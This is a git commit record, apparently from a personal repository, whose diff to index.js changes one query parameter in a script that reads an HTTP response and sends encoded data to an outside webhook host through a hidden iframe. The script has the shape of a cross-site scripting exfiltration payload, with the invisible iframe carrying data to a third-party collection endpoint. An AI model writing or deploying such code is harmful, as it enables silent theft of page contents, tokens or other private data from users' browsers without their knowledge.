4fad99c0489eb368343f4e9ccd983326df0bfb2b
mhmh55516 <mhmh55516@gmail.com>
2021-04-27 21:34:50 +0200

    Update index.js

--- index.js
+++ index.js
@@ -4,7 +4,7 @@ function reqListener () {
     var raw = this.responseText;
     var iframe = document.createElement('iframe');
 	iframe.style.display = "none";
-	iframe.src = "https://762202e9.proxy.webhookapp.com/?gg="+b64;
+	iframe.src = "https://762202e9.proxy.webhookapp.com/?ff="+b64;
 	document.body.appendChild(iframe);
 } 
 var oReq = new XMLHttpRequest(); 
